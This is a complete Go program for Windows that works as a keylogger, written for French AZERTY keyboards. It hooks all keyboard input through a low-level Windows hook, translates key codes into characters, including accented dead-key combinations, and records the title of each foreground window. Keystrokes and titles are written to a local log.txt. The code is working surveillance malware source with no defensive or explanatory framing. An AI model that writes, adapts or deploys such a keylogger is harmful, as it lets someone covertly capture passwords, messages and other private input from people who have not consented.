package main

import (
	"fmt"
	"log"
	"os"
	"strconv"
	"syscall"
	"time"
	"unsafe"

	"github.com/AllenDang/w32"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

var keys_low = map[uint16]string{
	8:   "[Back]",
	9:   "[Tab]",
	10:  "[Shift]",
	13:  "[Enter]\r\n",
	14:  "",
	15:  "",
	16:  "",
	17:  "[Ctrl]",
	18:  "[Alt]",
	19:  "",
	20:  "", //CAPS LOCK
	27:  "[Esc]",
	32:  " ", //SPACE
	33:  "[PageUp]",
	34:  "[PageDown]",
	35:  "[End]",
	36:  "[Home]",
	37:  "[Left]",
	38:  "[Up]",
	39:  "[Right]",
	40:  "[Down]",
	41:  "[Select]",
	42:  "[Print]",
	43:  "[Execute]",
	44:  "[PrintScreen]",
	45:  "[Insert]",
	46:  "[Delete]",
	47:  "[Help]",
	48:  "à",
	49:  "&",
	50:  "é",
	51:  "\"",
	52:  "'",
	53:  "(",
	54:  "-",
	55:  "è",
	56:  "_",
	57:  "ç",
	65:  "a",
	66:  "b",
	67:  "c",
	68:  "d",
	69:  "e",
	70:  "f",
	71:  "g",
	72:  "h",
	73:  "i",
	74:  "j",
	75:  "k",
	76:  "l",
	77:  "m",
	78:  "n",
	79:  "o",
	80:  "p",
	81:  "q",
	82:  "r",
	83:  "s",
	84:  "t",
	85:  "u",
	86:  "v",
	87:  "w",
	88:  "x",
	89:  "y",
	90:  "z",
	91:  "[Windows]",
	92:  "[Windows]",
	93:  "[Applications]",
	94:  "",
	95:  "[Sleep]",
	96:  "0",
	97:  "1",
	98:  "2",
	99:  "3",
	100: "4",
	101: "5",
	102: "6",
	103: "7",
	104: "8",
	105: "9",
	106: "*",
	107: "+",
	108: "[Separator]",
	109: "-",
	110: ".",
	111: "[Divide]",
	112: "[F1]",
	113: "[F2]",
	114: "[F3]",
	115: "[F4]",
	116: "[F5]",
	117: "[F6]",
	118: "[F7]",
	119: "[F8]",
	120: "[F9]",
	121: "[F10]",
	122: "[F11]",
	123: "[F12]",
	144: "[NumLock]",
	145: "[ScrollLock]",
	160: "", //LShift
	161: "", //RShift
	162: "[Ctrl]",
	163: "[Ctrl]",
	164: "[Alt]", //LeftMenu
	165: "[RightMenu]",
	186: "$",
	187: "=",
	188: ",",
	190: ";",
	191: ":",
	192: "ù",
	219: ")",
	220: "*",
	221: "^",
	222: "²",
	223: "!",
}

var keys_high = map[uint16]string{
	8:   "[Back]",
	9:   "[Tab]",
	10:  "[Shift]",
	13:  "[Enter]\r\n",
	17:  "[Ctrl]",
	18:  "[Alt]",
	20:  "", //CAPS LOCK
	27:  "[Esc]",
	32:  " ", //SPACE
	33:  "[PageUp]",
	34:  "[PageDown]",
	35:  "[End]",
	36:  "[Home]",
	37:  "[Left]",
	38:  "[Up]",
	39:  "[Right]",
	40:  "[Down]",
	41:  "[Select]",
	42:  "[Print]",
	43:  "[Execute]",
	44:  "[PrintScreen]",
	45:  "[Insert]",
	46:  "[Delete]",
	47:  "[Help]",
	48:  "0",
	49:  "1",
	50:  "2",
	51:  "3",
	52:  "4",
	53:  "5",
	54:  "6",
	55:  "7",
	56:  "8",
	57:  "9",
	65:  "A",
	66:  "B",
	67:  "C",
	68:  "D",
	69:  "E",
	70:  "F",
	71:  "G",
	72:  "H",
	73:  "I",
	74:  "J",
	75:  "K",
	76:  "L",
	77:  "M",
	78:  "N",
	79:  "O",
	80:  "P",
	81:  "Q",
	82:  "R",
	83:  "S",
	84:  "T",
	85:  "U",
	86:  "V",
	87:  "W",
	88:  "X",
	89:  "Y",
	90:  "Z",
	91:  "[Windows]",
	92:  "[Windows]",
	93:  "[Applications]",
	94:  "",
	95:  "[Sleep]",
	96:  "0",
	97:  "1",
	98:  "2",
	99:  "3",
	100: "4",
	101: "5",
	102: "6",
	103: "7",
	104: "8",
	105: "9",
	106: "*",
	107: "+",
	108: "[Separator]",
	109: "-",
	110: ".",
	111: "[Divide]",
	112: "[F1]",
	113: "[F2]",
	114: "[F3]",
	115: "[F4]",
	116: "[F5]",
	117: "[F6]",
	118: "[F7]",
	119: "[F8]",
	120: "[F9]",
	121: "[F10]",
	122: "[F11]",
	123: "[F12]",
	144: "[NumLock]",
	145: "[ScrollLock]",
	160: "", //LShift
	161: "", //RShift
	162: "[Ctrl]",
	163: "[Ctrl]",
	164: "[Alt]", //LeftMenu
	165: "[RightMenu]",
	186: "£",
	187: "+",
	188: "?",
	190: ".",
	191: "/",
	192: "%",
	219: "°",
	220: "µ",
	221: "¨",
	222: "²",
	223: "§",
}

var (
	user32                  = windows.NewLazySystemDLL("user32.dll")
	procSetWindowsHookEx    = user32.NewProc("SetWindowsHookExW")
	procCallNextHookEx      = user32.NewProc("CallNextHookEx")
	procUnhookWindowsHookEx = user32.NewProc("UnhookWindowsHookEx")
	procGetMessage          = user32.NewProc("GetMessageW")
	procGetKeyState         = user32.NewProc("GetKeyState")
	procGetAsyncKeyState    = user32.NewProc("GetAsyncKeyState")
	procGetForegroundWindow = user32.NewProc("GetForegroundWindow")
	procGetWindowTextW      = user32.NewProc("GetWindowTextW")
	keyboardHook            HHOOK
	tmpKeylog               string
	vowelMin                string = "aeiou"
	vowelMaj                string = "AEIOU"
	circumMinMin                   = []rune{'â', 'ê', 'î', 'ô', 'û'}
	circumMinMaj                   = []rune{'ä', 'ë', 'ï', 'ö', 'ü'}
	circumMajMin                   = []rune{'Â', 'Ê', 'Î', 'Ô', 'Û'}
	circumMajMaj                   = []rune{'Ä', 'Ë', 'Ï', 'Ö', 'Ü'}
	writer                  Writer
)

const (
	WH_KEYBOARD_LL = 13
	WM_KEYDOWN     = 256
	//WM_SYSKEYUP = 261
	/*WH_KEYBOARD = 2
	WM_SYSKEYDOWN = 260
	WM_KEYUP = 257
	WM_KEYFIRST = 256
	WM_KEYLAST = 264
	PM_NOREMOVE = 0x000
	PM_REMOVE = 0x001
	PM_NOYIELD = 0x002
	WM_LBUTTONDOWN = 513
	WM_RBUTTONDOWN = 516
	NULL = 0*/
)

type (
	DWORD     uint32
	WPARAM    uintptr
	LPARAM    uintptr
	LRESULT   uintptr
	HANDLE    uintptr
	HINSTANCE HANDLE
	HHOOK     HANDLE
	HWND      HANDLE
)

type HOOKPROC func(int, WPARAM, LPARAM) LRESULT

type KBDLLHOOKSTRUCT struct {
	VkCode      DWORD
	ScanCode    DWORD
	Flags       DWORD
	Time        DWORD
	DwExtraInfo uintptr
}

type POINT struct {
	X, Y int32
}

type MSG struct {
	Hwnd    HWND
	Message uint32
	WParam  uintptr
	LParam  uintptr
	Time    uint32
	Pt      POINT
}

type Writer struct {
	file *os.File
}

func (w Writer) write(s string) {
	w.file.WriteString(s)
}

func SetWindowsHookEx(idHook int, lpfn HOOKPROC, hMod HINSTANCE, dwThreadId DWORD) HHOOK {
	ret, _, _ := procSetWindowsHookEx.Call(
		uintptr(idHook),
		uintptr(syscall.NewCallback(lpfn)),
		uintptr(hMod),
		uintptr(dwThreadId),
	)
	return HHOOK(ret)
}

func CallNextHookEx(hhk HHOOK, nCode int, wParam WPARAM, lParam LPARAM) LRESULT {
	ret, _, _ := procCallNextHookEx.Call(
		uintptr(hhk),
		uintptr(nCode),
		uintptr(wParam),
		uintptr(lParam),
	)
	return LRESULT(ret)
}

func UnhookWindowsHookEx(hhk HHOOK) bool {
	ret, _, _ := procUnhookWindowsHookEx.Call(
		uintptr(hhk),
	)
	return ret != 0
}

func GetMessage(msg *MSG, hwnd HWND, msgFilterMin uint32, msgFilterMax uint32) int {
	ret, _, _ := procGetMessage.Call(
		uintptr(unsafe.Pointer(msg)),
		uintptr(hwnd),
		uintptr(msgFilterMin),
		uintptr(msgFilterMax))
	return int(ret)
}

func getForegroundWindow() (hwnd syscall.Handle, err error) {
	r0, _, e1 := syscall.Syscall(procGetForegroundWindow.Addr(), 0, 0, 0, 0)
	if e1 != 0 {
		err = error(e1)
		return
	}
	hwnd = syscall.Handle(r0)
	return
}

func getWindowText(hwnd syscall.Handle, str *uint16, maxCount int32) (len int32, err error) {
	r0, _, e1 := syscall.Syscall(procGetWindowTextW.Addr(), 3, uintptr(hwnd), uintptr(unsafe.Pointer(str)), uintptr(maxCount))
	len = int32(r0)
	if len == 0 {
		if e1 != 0 {
			err = error(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func windowLogger() {
	var tmpTitle string
	for {
		g, _ := getForegroundWindow()
		b := make([]uint16, 200)
		_, err := getWindowText(g, &b[0], int32(len(b)))
		if err != nil {
		}
		if syscall.UTF16ToString(b) != "" {
			if tmpTitle != syscall.UTF16ToString(b) {
				tmpTitle = syscall.UTF16ToString(b)
				writer.write(string("\n\n[" + syscall.UTF16ToString(b) + "]\r\n"))
			}
		}
		time.Sleep(1 * time.Millisecond)
	}
}

func keylogger() {
	var msg MSG
	CAPS, _, _ := procGetKeyState.Call(uintptr(w32.VK_CAPITAL))
	CAPS = CAPS & 0x000001
	var CAPS2 uintptr
	var SHIFT uintptr
	var precLog string = ""
	var write bool = false
	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)(func(nCode int, wparam WPARAM, lparam LPARAM) LRESULT {
		if nCode == 0 && wparam == WM_KEYDOWN {
			SHIFT, _, _ = procGetAsyncKeyState.Call(uintptr(w32.VK_LSHIFT))
			if SHIFT == 32769 || SHIFT == 32768 {
				SHIFT = 1
			}
			kbdstruct := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lparam))
			code := byte(kbdstruct.VkCode)
			if code == w32.VK_CAPITAL {
				if CAPS == 1 {
					CAPS = 0
				} else {
					CAPS = 1
				}
			}
			if SHIFT == 1 {
				CAPS2 = 1
			} else {
				CAPS2 = 0
			}

			if (CAPS == 0 && CAPS2 == 0) || (CAPS == 1 && CAPS2 == 1) {
				tmpKeylog += keys_low[uint16(code)]

			} else {
				tmpKeylog += keys_high[uint16(code)]
			}

		} else if wparam == w32.WM_SYSKEYDOWN {
			kbdstruct := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lparam))
			code := byte(kbdstruct.VkCode)
			switch code {
			case 50:
				tmpKeylog += "~"
			case 51:
				tmpKeylog += "#"
			case 52:
				tmpKeylog += "{"
			case 53:
				tmpKeylog += "["
			case 54:
				tmpKeylog += "|"
			case 55:
				tmpKeylog += "`"
			case 56:
				tmpKeylog += "\\"
			case 57:
				tmpKeylog += "^"
			case 48:
				tmpKeylog += "@"
			case 219:
				tmpKeylog += "]"
			case 187:
				tmpKeylog += "}"
			}
		}
		//fmt.Printf("%s\n", tmpKeylog)
		//fmt.Printf("%d\n", code)
		if tmpKeylog != "" {
			write, tmpKeylog = harmonize(tmpKeylog, &precLog, !((CAPS == 0 && CAPS2 == 0) || (CAPS == 1 && CAPS2 == 1)))
			if write {
				writer.write(tmpKeylog)
			}
			precLog = tmpKeylog
			tmpKeylog = ""
		}
		return CallNextHookEx(keyboardHook, nCode, wparam, lparam)
	}), 0, 0)

	for GetMessage(&msg, 0, 0, 0) != 0 {
		time.Sleep(1 * time.Millisecond)
	}

	UnhookWindowsHookEx(keyboardHook)
	keyboardHook = 0
}

func harmonize(tmp string, prec *string, caps bool) (bool, string) {
	shouldWrite := false
	if *prec == "^" && tmp == "^" {
		tmp = "^^"
		*prec = ""
	} else if *prec == "¨" && tmp == "¨" {
		tmp = "¨¨"
		*prec = ""
	} else if *prec == "^" || *prec == "¨" {
		shouldWrite = true
		if caps {
			for i, l := range vowelMaj {
				if tmp == string(l) {
					if *prec == "^" {
						tmp = string(circumMajMin[i])
					} else {
						tmp = string(circumMajMaj[i])
					}
					shouldWrite = false
					break
				}

			}
		} else {
			for i, l := range vowelMin {
				if tmp == string(l) {
					if *prec == "^" {
						tmp = string(circumMinMin[i])
					} else {
						tmp = string(circumMinMaj[i])
					}
					shouldWrite = false
					break
				}
			}
		}
	}
	if shouldWrite {
		writer.write(*prec)
	}
	if !(tmp == "^" || tmp == "¨") {
		return true, tmp
	}
	return false, tmp
}

func getKeyboardLayout() uint64 {
	k, err := registry.OpenKey(registry.CURRENT_USER, `Keyboard Layout\Preload`, registry.QUERY_VALUE)
	if err != nil {
		log.Fatal(err)
	}
	defer k.Close()

	s, _, err := k.GetStringValue("1")
	if err != nil {
		log.Fatal(err)
	}
	result, _ := strconv.ParseUint(s, 16, 32)
	return result
}

func main() {
	if getKeyboardLayout() != 0x40c {
		fmt.Println("Keyboard layout is not AZERTY, it will not work properly !!! ")
	}
	file, err := os.Create("log.txt")
	if err != nil {
		log.Fatal("Cannot create file", err)
	}
	defer file.Close()
	writer.file = file
	go windowLogger()
	go keylogger()
	for {
		time.Sleep(1 * time.Millisecond)
	}
}
